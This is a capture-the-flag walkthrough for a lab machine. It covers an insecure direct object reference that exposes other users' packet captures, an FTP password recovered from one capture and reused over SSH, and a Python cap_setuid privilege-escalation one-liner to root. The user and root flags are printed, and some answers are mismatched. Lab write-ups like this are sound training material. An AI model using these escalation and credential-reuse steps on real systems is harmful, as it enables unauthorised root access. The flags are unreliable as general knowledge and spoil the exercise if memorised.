#capabilities

How many TCP ports are open?

`3`

After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

`http://10.10.10.245/data/3`

Are you able to get to other users' scans?

`yes`

What is the ID of the PCAP file that contains sensative data?

http://10.10.10.245/data/0

Which application layer protocol in the pcap file can the sensetive data be found in?

`http`

Which application layer protocol in the pcap file can the sensetive data be found in?

`ftp`

We've managed to collect nathan's FTP password. On what other service does this password work?

```
220 (vsFTPd 3.0.3)

USER nathan

331 Please specify the password.

PASS Buck3tH4TF0RM3!

230 Login successful.

SYST

215 UNIX Type: L8

```

```
ssh nathan@10.10.10.245
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
nathan@10.10.10.245's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Dec 16 22:07:37 UTC 2024

  System load:           0.01
  Usage of /:            36.7% of 8.73GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:feb0:5a2

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Dec 16 20:06:32 2024 from 10.10.14.209
```


Submit the flag located in the nathan user's home directory.

```
nathan@cap:~$ pwd
/home/nathan
nathan@cap:~$ ls
snap  user.txt
nathan@cap:~$ cat user.txt
4d54803998458d852b1f06e763de94c3

nathan@cap:~$
```

What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

```
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
nathan@cap:~$

/usr/bin/python3.8
```


Submit the flag located in root's home directory.

```
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# ls
snap  user.txt
# cd /root
# ls
root.txt  snap
# cat root.txt
471f2057170e241ba7e90fc3490e7629
#
```

`471f2057170e241ba7e90fc3490e7629`

## Rererecias 
- https://gtfobins.github.io/gtfobins/python/#capabilities